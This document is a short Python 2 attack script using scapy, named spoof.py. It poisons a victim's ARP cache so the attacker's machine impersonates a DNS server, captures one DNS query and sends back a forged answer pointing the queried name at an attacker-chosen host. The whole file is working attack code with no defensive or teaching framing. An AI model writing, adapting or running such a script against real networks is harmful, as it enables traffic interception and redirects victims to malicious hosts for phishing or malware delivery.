#!/usr/bin/env python
import sys
from scapy import *
conf.verb=1

#### Adapt the following settings ####
conf.iface = 'eth2'
mac_address = '00:11:22:AA:BB:CC' # Real Mac address of interface conf.iface (Host A)
####
  
if len(sys.argv) != 4:
    print "Usage: ./spoof.py <dns_server> <victim> <impersonating_host>"
    sys.exit(1)

dns_server = sys.argv[1]
target=sys.argv[2]
malhost = sys.argv[3]
  
timevalid = '\x00\x00\x07\x75'
alen = '\x00\x04'
  
def arpspoof(psrc, pdst, mac):
    a = ARP()
    a.op = 2
    a.hwsrc = mac
    a.psrc = psrc
    a.hwdst = "ff:ff:ff:ff:ff:ff"
    a.pdst = pdst
    send(a)
  
def mkdnsresponse(dr, malhost):
    d = DNS()
    d.id = dr.id
    d.qr = 1
    d.opcode = 16
    d.aa = 0
    d.tc = 0
    d.rd = 0
    d.ra = 1
    d.z = 8
    d.rcode = 0
    d.qdcount = 1
    d.ancount = 1
    d.nscount = 0
    d.arcount = 0
    d.qd = str(dr.qd)
    d.an = str(dr.qd) + timevalid + alen + inet_aton(malhost)
    return d
  
ethlen = len(Ether())
iplen = len(IP())
udplen = len(UDP())
  
arpspoof(dns_server, target, mac_address)
p = sniff(filter='port 53', iface='eth2', count=1)
  
e = p[0]
t = str(e)
i = IP(t[ethlen:])
u = UDP(t[ethlen + iplen:])
d = DNS(t[ethlen + iplen + udplen:])
  
dpkt = mkdnsresponse(d, malhost)
  
dpkt.display()
  
f = IP(src=i.dst, dst=i.src)/UDP(sport=u.dport, dport=u.sport)/dpkt
send(f)

